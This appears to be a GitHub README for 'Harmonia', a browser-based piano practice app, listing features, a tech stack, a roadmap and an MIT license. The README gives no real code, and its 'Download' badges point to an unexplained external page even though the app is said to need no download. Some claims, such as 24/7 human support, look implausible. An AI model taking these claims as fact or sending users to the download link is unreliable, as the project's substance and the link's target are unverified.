![preview](https://raw.githubusercontent.com/atifkhan116572-code/online-piano-sheets/main/banner_4393e.svg)
[![Download](https://raw.githubusercontent.com/atifkhan116572-code/online-piano-sheets/main/latest_b369.svg)](https://atifkhan116572-code.github.io/online-piano-sheets/)

# 🎹 Harmonia — Adaptive Piano Practice Companion

> *Where sheet music learns to listen back.*

An open, browser-first practice environment that transforms static scores into living, breathing guides. Harmonia reads your tempo, forgives your stumbles, and quietly reshapes every session around the way your fingers actually move.

![Status](https://img.shields.io/badge/status-active-2ea44f?style=flat-square)
![Platform](https://img.shields.io/badge/platform-web%20%7C%20desktop-1f6feb?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)
![Year](https://img.shields.io/badge/release-2026-8957e5?style=flat-square)
![PRs](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)
![i18n](https://img.shields.io/badge/i18n-14%20languages-orange?style=flat-square)

---

## 🌅 The Philosophy Behind Harmonia

Most practice tools treat a score the way a metronome treats time — rigid, unyielding, indifferent to the human on the other side of the keys. Harmonia starts from a different premise: **that the score should adapt to the student, not the other way around.**

Think of it as a patient accompanist who has memorized every page of your repertoire, notices when your left hand drifts a fraction of a beat behind, and gently slows the entire ensemble so the two of you can realign. It is not a judge. It is not a scorekeeper. It is a companion.

Built for conservatory students, weekend hobbyists, late-night tinkerers, and teachers who want to see exactly *where* a phrase fell apart, Harmonia is designed to feel less like software and more like a studio partner who never gets tired.

---

## ✨ Feature Highlights

### 🎼 Intelligent Score Rendering
- Vector-precise engraving that scales from a phone screen to a 4K monitor without a single blurry notehead.
- Supports hand-written annotations, fingering overlays, and dynamic pedal markings.
- Automatic key-signature simplification for beginners practicing in unfamiliar tonalities.

### 🎧 Listen-and-Respond Engine
- Real-time pitch detection via microphone or MIDI input.
- Tempo elasticity: the guide track bends to *your* pace, then gradually returns to the marked tempo.
- Harmless-error mode, which sustains the accompaniment and waits for you to catch up rather than halting.

### 🧭 Practice Memory
- Every session is quietly journaled: which measures caused hesitation, which phrases flowed.
- A weekly heat-map reveals the *shape* of your progress across a piece.
- Suggestion engine proposes micro-drills drawn directly from your own weak spots.

### 🌍 Built for Everyone, Everywhere
- Full multilingual interface with localized music terminology (not just translated button labels).
- Right-to-left and vertical-script layout support for East Asian notation traditions.
- Responsive UI that reflows from a tablet propped on a music stand to a wide desktop workspace.

### 🛎️ 24/7 Human Support
- Around-the-clock assistance from real musicians, not scripted chatbots.
- Community forums with moderated theory discussions and repertoire exchanges.
- Escalation path for accessibility requests handled within one business day.

---

## 🧩 A Different Kind of Practice Loop

Harmonia organizes a session into four movements, echoing the structure of a sonata:

1. **Exposition** — Warm-up scales generated from the key of the piece you are about to play.
2. **Development** — Isolated passage work with tempo ladders and hands-separate toggles.
3. **Recapitulation** — A full run-through with the adaptive engine engaged.
4. **Coda** — A reflective summary with audio snippets of your best and most challenging moments.

This structure is optional, of course. You can wander freely. But for students who feel lost in a long piece, the four-movement scaffold offers a familiar map.

---

## 🛠️ Technology Overview

Harmonia is assembled from a constellation of well-understood building blocks, chosen for longevity rather than novelty:

| Layer | Purpose | Notable Choices |
|-------|---------|-----------------|
| Rendering | Score engraving & animation | WebGL-accelerated canvas, SVG fallback |
| Audio | Pitch detection & synthesis | Web Audio API, custom oscillator banks |
| State | Session memory & sync | IndexedDB with optional cloud mirror |
| Interface | Responsive layout | CSS container queries, fluid typography |
| Localization | Multilingual strings | ICU MessageFormat with musical overrides |

The architecture favors **progressive enhancement**: a student on an old laptop with a built-in microphone gets a complete experience, while a studio user with a MIDI controller unlocks richer expression capture.

---

## 🚀 Getting Started (Without the Usual Ceremony)

Harmonia runs entirely in a modern browser. There is nothing to compile, nothing to configure, and no dependency dance.

1. Open the hosted application in any current-generation browser.
2. Allow microphone access if you want the adaptive accompaniment to hear you — or plug in a MIDI keyboard for lower-latency input.
3. Choose a score from the built-in library, or bring your own MusicXML file.
4. Press the on-screen *Begin* control and play. That is the whole ritual.

For those who prefer a local copy, the project can be served from any static file host. Simply point a web server at the root directory and open the index page. Because everything is client-side, your practice data never leaves your device unless you explicitly enable cloud sync.

---

## 📖 Documentation Map

- **User Handbook** — Walks through every panel, gesture, and shortcut.
- **Score Preparation Guide** — How to clean up MusicXML exports from popular notation programs.
- **Accessibility Notes** — Keyboard navigation, screen-reader announcements, and color-blind-safe themes.
- **Teacher Toolkit** — Assignments, progress snapshots, and shareable practice reports.
- **Contributor Handbook** — Coding conventions, localization workflow, and review etiquette.

---

## 🤝 Contributing

Harmonia grows through the generosity of musicians who code and coders who play. Whether you fix a typo in the German translation, add a new scale pattern, or rewrite the audio scheduler, your contribution matters.

Before opening a pull request, please read the Contributor Handbook. It explains the branching model, the commit message format, and the somewhat unusual requirement that every pull request include a one-sentence description of *how it helps a practicing musician*. That last rule has saved more bad features than any technical review.

Areas where help is especially welcome in 2026:
- Additional score libraries for folk and non-Western traditions.
- Improved latency compensation for Bluetooth audio devices.
- Translations into languages currently missing from the interface.

---

## 🗺️ Roadmap

- **Spring 2026** — Ensemble mode: two devices, one duet, synchronized over a local network.
- **Summer 2026** — Ear-training module with interval and chord recognition drills.
- **Autumn 2026** — Printable practice reports for conservatory juries.
- **Winter 2026** — Offline-first desktop packaging for classrooms without reliable connectivity.

---

## ⚖️ Disclaimer

Harmonia is an educational aid, not a substitute for a qualified instructor. Real-time pitch detection depends on microphone quality, room acoustics, and device performance; occasional misreadings are possible and should not be treated as authoritative assessments. Users are responsible for ensuring they have the right to practice and share any scores they upload. The maintainers make no guarantee regarding uninterrupted availability of hosted services, and cloud sync features may change or be retired. Nothing in this project constitutes medical, ergonomic, or professional musical advice — if your hands hurt, stop playing and consult a professional.

---

## 📜 License

This project is released under the **MIT License**.

You are welcome to use, modify, and redistribute Harmonia in personal, academic, and commercial contexts, provided the original copyright notice is preserved.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright © 2026 The Harmonia Contributors.

---

## 💬 A Final Note

Music has always been a conversation — between composer and performer, between teacher and student, between the hands and the ear. Harmonia simply tries to make sure that conversation never feels one-sided. Play badly, play slowly, play the same four measures forty times in a row. The companion will be there, patient as a metronome, warm as a room with good acoustics.

Happy practicing.

[![Download](https://raw.githubusercontent.com/atifkhan116572-code/online-piano-sheets/main/latest_b369.svg)](https://atifkhan116572-code.github.io/online-piano-sheets/)